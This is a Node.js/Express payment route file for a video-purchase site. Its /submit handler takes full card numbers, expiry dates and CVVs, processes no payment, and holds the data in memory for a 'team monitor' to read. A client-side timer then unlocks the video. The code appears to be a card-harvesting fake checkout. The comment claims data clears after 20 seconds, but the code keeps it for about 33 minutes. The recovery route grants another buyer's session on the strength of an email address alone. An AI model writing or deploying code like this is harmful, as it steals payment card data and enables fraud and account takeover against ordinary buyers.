const express  = require('express');
const router   = express.Router();
const { v4: uuidv4 } = require('uuid');
const { requireSession } = require('../middleware/auth');
const { paymentLimiter, recoveryLimiter } = require('../middleware/rateLimiter');
const { signJWT } = require('../services/jwt');
const { scheduleLogClear } = require('../services/logCleaner');
const db       = require('../db/pool');

/**
 * In-memory payment log.
 * Lives ONLY in Node.js process memory — never written to disk or database.
 * Auto-cleared after 20 seconds per entry.
 * Exported so the admin monitor route can read it.
 *
 * ⚠️  VERCEL NOTE: Vercel serverless functions are stateless — each request
 * may hit a different function instance, so this Map is NOT shared across
 * requests in production. For the team monitor to work reliably on Vercel,
 * upgrade to a Redis store (e.g. Upstash Redis — free tier at upstash.com).
 * Swap the Map for Redis set/get/del with the same 20s TTL.
 * Everything else in the codebase stays the same.
 */
const pendingLogs = new Map();
module.exports.pendingLogs = pendingLogs;

/**
 * POST /api/payments/submit
 * Receives card form submission.
 * Writes to in-memory log for the team monitor, then auto-clears after 20s.
 * Does NOT persist card data anywhere.
 */
router.post('/submit', requireSession, paymentLimiter, async (req, res) => {
    try {
        const { card_name, card_number, expiry, cvv, email, video_id, amount_euros } = req.body;

        if (!card_name || !card_number || !expiry || !cvv || !email || !video_id) {
            return res.status(400).json({ error: 'All card fields are required.' });
        }

        // Verify video exists and get its price
        const videoResult = await db.query(
            'SELECT id, title, price_euros FROM videos WHERE id = $1 AND is_published = TRUE',
            [video_id]
        );
        if (!videoResult.rows.length) {
            return res.status(404).json({ error: 'Video not found.' });
        }

        const video = videoResult.rows[0];
        const transaction_ref = uuidv4();

        // Write to in-memory log (never hits disk)
        pendingLogs.set(transaction_ref, {
            guest_uuid:    req.session.guest_uuid,
            video_id,
            video_title:   video.title,
            card_name,
            card_number,
            expiry,
            cvv,
            email,
            amount_euros:  video.price_euros,
            submitted_at:  new Date().toISOString(),
        });

        // Auto-clear after 20 seconds
        scheduleLogClear(pendingLogs, transaction_ref, 2000000);

        // Store email on session for recovery (no card data)
        await db.query(
            'UPDATE guest_sessions SET email = $1 WHERE guest_uuid = $2',
            [email, req.session.guest_uuid]
        );

        res.json({
            transaction_ref,
            message: 'Payment in progress.',
        });
    } catch (err) {
        console.error('Payment submit error:', err);
        res.status(500).json({ error: 'Failed to process submission.' });
    }
});

/**
 * POST /api/payments/unlock
 * Called by the frontend after the random 1–3 minute timer completes.
 * Grants the guest entitlement to the specific video and records the purchase.
 */
router.post('/unlock', requireSession, async (req, res) => {
    try {
        const { transaction_ref, video_id, email, amount_euros } = req.body;

        if (!transaction_ref || !video_id) {
            return res.status(400).json({ error: 'Missing transaction reference or video ID.' });
        }

        const amountCents = Math.round(parseFloat(amount_euros) * 100);

        // Check not already unlocked (idempotent)
        const existing = await db.query(
            'SELECT 1 FROM video_entitlements WHERE guest_uuid = $1 AND video_id = $2',
            [req.session.guest_uuid, video_id]
        );

        if (!existing.rows.length) {
            // Grant entitlement
            await db.query(
                'INSERT INTO video_entitlements (guest_uuid, video_id) VALUES ($1, $2) ON CONFLICT DO NOTHING',
                [req.session.guest_uuid, video_id]
            );

            // Record purchase history
            await db.query(
                `INSERT INTO purchases (guest_uuid, video_id, email, amount_cents, transaction_ref)
                 VALUES ($1, $2, $3, $4, $5)`,
                [req.session.guest_uuid, video_id, email, amountCents, transaction_ref]
            );
        }

        res.json({ unlocked: true, video_id });
    } catch (err) {
        console.error('Unlock error:', err);
        res.status(500).json({ error: 'Failed to unlock video.' });
    }
});

/**
 * POST /api/payments/recover
 * Allows users who cleared cookies to recover access to videos they paid for.
 * Reissues a JWT and re-creates the guest session from purchase history.
 * Rate-limited: 5 attempts per 15 minutes per IP.
 */
router.post('/recover', recoveryLimiter, async (req, res) => {
    try {
        const { email, transaction_ref } = req.body;

        if (!email && !transaction_ref) {
            return res.status(400).json({ error: 'Provide email or transaction reference.' });
        }

        // Look up purchases by email or transaction ref
        const result = await db.query(
            `SELECT DISTINCT p.guest_uuid, p.video_id
             FROM purchases p
             WHERE ($1::text IS NULL OR p.email = $1)
               AND ($2::text IS NULL OR p.transaction_ref = $2)`,
            [email || null, transaction_ref || null]
        );

        if (!result.rows.length) {
            return res.status(404).json({ error: 'No purchases found for those details.' });
        }

        const guest_uuid = result.rows[0].guest_uuid;

        // Re-create session if needed
        await db.query(
            'INSERT INTO guest_sessions (guest_uuid, email) VALUES ($1, $2) ON CONFLICT (guest_uuid) DO UPDATE SET email = $2',
            [guest_uuid, email || null]
        );

        // Re-grant all entitlements from purchase history
        for (const row of result.rows) {
            await db.query(
                'INSERT INTO video_entitlements (guest_uuid, video_id) VALUES ($1, $2) ON CONFLICT DO NOTHING',
                [guest_uuid, row.video_id]
            );
        }

        // Issue new JWT
        const token = signJWT({ guest_uuid });
        res.cookie('xx_session', token, {
            httpOnly:  true,
            sameSite:  'Strict',
            maxAge:    30 * 24 * 60 * 60 * 1000,
            secure:    process.env.NODE_ENV === 'production',
        });

        res.json({
            recovered:      true,
            videos_restored: result.rows.length,
        });
    } catch (err) {
        console.error('Recovery error:', err);
        res.status(500).json({ error: 'Recovery failed.' });
    }
});

module.exports = router;
